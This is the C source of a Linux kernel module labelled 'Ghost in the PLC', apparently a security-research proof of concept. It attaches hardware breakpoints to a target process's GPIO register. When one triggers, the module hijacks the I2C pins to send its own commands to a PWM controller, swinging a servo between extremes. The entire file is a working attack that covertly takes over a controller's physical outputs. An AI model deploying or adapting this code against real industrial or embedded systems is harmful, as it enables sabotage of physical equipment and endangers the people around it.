/*
 * Usage: insmod drk.ko ppid=int gpioB=pchar hijack=int
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <linux/delay.h>
#include <linux/kthread.h>

static int ppid = 0;
static int hijack = 0;
static long set_p = 0;
static char* gpioB = "0x00";
int tCount = 0;
static struct perf_event* pThread[20];
volatile unsigned* gpio = 0x00;
struct perf_event* __percpu drpcpu;
struct task_struct* task = NULL;

module_param(ppid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(ppid, "Process PID");
module_param(gpioB, charp, 0000);
MODULE_PARM_DESC(gpioB, "Base address of GPIO");
module_param(hijack, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No

#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
#define GPIO_SET *(gpio+7)
#define GPIO_CLR *(gpio+10)
#define GET_GPIO(g) (*(gpio+13)&(1<<g))
#define GPIO_PULL *(gpio+37)
#define GPIO_PULLCLK0 *(gpio+38)

// Define I/O operations on I2C pins.
#define I2C_DATA 2 // Pin 2 attached to Adafruit PWM controller (I2C SDA1)
#define I2C_CLK  3 // Pin 3 attached to Adafruit PWM controller (I2C SCL1)
#define i2c_data_high() (GPIO_SET = 1 << I2C_DATA)
#define i2c_data_low() (GPIO_CLR = 1 << I2C_DATA)
#define i2c_clk_high() (GPIO_SET = 1 << I2C_CLK)
#define i2c_clk_low() (GPIO_CLR = 1 << I2C_CLK)
#define i2c_data_read() (GET_GPIO(I2C_DATA))
#define i2c_clk_read() (GET_GPIO(I2C_CLK))


void i2c_start(void) {
	/* I2C Start condition, data line goes low when clock is high */
	i2c_data_high();
	i2c_clk_high();
	while(i2c_clk_read() == 0);
	i2c_data_low();
	i2c_clk_low();
}

void i2c_stop(void) {
	/* I2C Stop condition, clock goes high when data is low */
	i2c_clk_low();
	i2c_data_low();
	while(i2c_data_read() == 1);
	i2c_clk_high();
	while(i2c_clk_read() == 0);
	i2c_data_high();
}

void i2c_write(unsigned char data) {
	unsigned char outBits;
	unsigned char inBit;
	
	for (outBits = 0; outBits < 8; outBits++) {
		if (data & 0x80)
			i2c_data_high();
		else
			i2c_data_low();
		data  <<= 1;
		/* Generate clock for 8 data bits */
		i2c_clk_high();
		/* Wait for clock to go high, clock stretching */
		while(i2c_clk_read() == 0);
		i2c_clk_low();
	}

	/* Generate clock for ACK */
	i2c_clk_high();
	/* Wait for clock to go high, clock stretching */
	while(i2c_clk_read() == 0);
	/* Clock high, valid ACK */
	inBit = i2c_data_read();
	i2c_clk_low();
}

int move_func(void* data) {

	int toggle = 1;

	if (hijack == 1) {

		printk(KERN_INFO "[DR] Set GPIO as output");
		// Set GPIO as output so we could write to it.
		INP_GPIO(I2C_DATA);
		INP_GPIO(I2C_CLK);
		OUT_GPIO(I2C_DATA);
		OUT_GPIO(I2C_CLK);

		while (!kthread_should_stop()) {
			/*
			Adafruit PWM controller PCA9685 uses 12-bit PWM (0 - 4095)
			Datasheet: https://www.modmypi.com/download/PCA9685.pdf

			The servo motor duty cycles:
			 - 10% (minimum, -45°) --> 4096 / 10 = 409 = 199h
			 - 20% (maximum, +45°) --> 4096 / 5  = 818 = 332h

			Target: make the servo motor go crazy from -45° to +45°.
			*/

			printk(KERN_INFO "[DR] Start I2C transfer");
			i2c_start();
			i2c_write(0xE0); // 11100000 <-- All Call slave address (request write to PWM controller)

			printk(KERN_INFO "[DR] Set pulse start time to 0");
			// LED0_ON is the time when the pulse must start. Set time 0.  
			// High part
			i2c_write(0x07); // 00000111 <-- Set register address to LED0_ON_H
			i2c_write(0x00); // 00000000 <-- Set value for register LED0_ON_H (0)
			// Low part
			i2c_write(0x06); // 00000110 <-- Set register address to LED0_ON_L
			i2c_write(0x00); // 00000000 <-- Set value for register LED0_ON_L (0)

			// LED0_OFF is the time when the pulse must stop.
			// Let's toggle it between 10% and 20% duty-cycle.
			if (toggle) {
				printk(KERN_INFO "[DR] Set pulse stop time to 10%%");
				// Set time 199h for 10%.
				// High part
				i2c_write(0x09);
				i2c_write(0x01);
				// Low part
				i2c_write(0x08);
				i2c_write(0x99);
			} else {
				printk(KERN_INFO "[DR] Set pulse stop time to 20%%");
				// Or set time 332h for 20%.
				// High part
				i2c_write(0x09); // 00001001 <-- Set register address to LED0_OFF_H
				i2c_write(0x03); // 00000011 <-- Set value for register LED0_OFF_H (3h)
				// Low part
				i2c_write(0x08); // 00001000 <-- Set register address to LED0_OFF_L
				i2c_write(0x32); // 00110010 <-- Set value for register LED0_OFF_L (32h)
			}

			i2c_stop();

			toggle = !toggle;

			msleep(500);
		}

		printk(KERN_INFO "[DR] Reset GPIO to I2C alternate function");
		// Reset GPIO to alternate function 0 (I2C).
		INP_GPIO(I2C_DATA);
		INP_GPIO(I2C_CLK);
		SET_GPIO_ALT(I2C_DATA, 0);
		SET_GPIO_ALT(I2C_CLK, 0);
	}
	
	return 0;
}


static void dr_excp_handler(struct perf_event *bp, struct perf_sample_data *data, struct pt_regs *regs) {

		// Async call to the move function
		if (task == NULL) {
			task = kthread_run(&move_func, NULL, "move");
			if (IS_ERR((void*)task)) {
				printk(KERN_INFO "[DR_Handler] Creating thread... failed %ld\n", PTR_ERR((void*)task));
			}
		}

}

static int __init hw_break_module_init(void) {
	int ret;
	long l;					// Casted char pointer received from module_param
	char *endptr;				// End of casted char pointer
	struct task_struct *tsk;		// Process tsk struct
	struct task_struct *tTsk;		// Each thread tsk struct
	struct perf_event_attr attr;

	printk(KERN_INFO "[DR] init\n");

	l = simple_strtol(gpioB, &endptr, 0);
	if (endptr == NULL) {
		printk(KERN_INFO "[DR] Failed to cast input address!!");
		return 0;
	}

	gpio = (unsigned *)l; // GPIO base
	set_p = (l+(long)0x1C); // Offset of SET register

	printk(KERN_INFO "[DR] Target process: %d\n", ppid);
	printk(KERN_INFO "[DR] GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
	printk(KERN_INFO "[DR] GPIO SET Register: 0x%lx\n", set_p);
	printk(KERN_INFO "[DR] Hijack: %d\n", hijack);

	tsk = pid_task(find_vpid(ppid), PIDTYPE_PID);

	tTsk = tsk;
	if (tsk) {
		printk(KERN_INFO "[DR] Userland process struct_tsk PID: %d\n", ppid);
		do {
			hw_breakpoint_init(&attr);
			attr.bp_addr = set_p;
			attr.bp_len = HW_BREAKPOINT_LEN_4;
			attr.bp_type = HW_BREAKPOINT_RW;

			drpcpu = register_user_hw_breakpoint(&attr, dr_excp_handler, NULL, tTsk);
			pThread[tCount] = drpcpu;
			if (IS_ERR((void __force *)drpcpu)) {
				ret = PTR_ERR((void __force *)drpcpu);
				goto fail;
			}

			printk(KERN_INFO "[DR_Thread] Setting DR registers... done\n");
			tCount += 1;
		} while_each_thread(tsk, tTsk);
		printk(KERN_INFO "Thread count: %d\n", tCount);
	} else {
		printk(KERN_INFO "[DR_ERR]* Error pid_task failed!\n");
		return 0;
	}
	return 0;

fail:
	printk(KERN_INFO "[DR_Thread] Setting DR registers... failed %d\n", ret);
	return ret;
}

static void __exit hw_break_module_exit(void) {

	int i;
	for (i = 0; i < tCount; i++) {
		unregister_hw_breakpoint(pThread[i]);
	}
	kthread_stop(task);
	printk(KERN_INFO "[DR] exit\n");

}

module_init(hw_break_module_init);
module_exit(hw_break_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cl0wn & bl4ckic3");
MODULE_DESCRIPTION("Ghost in the PLC");
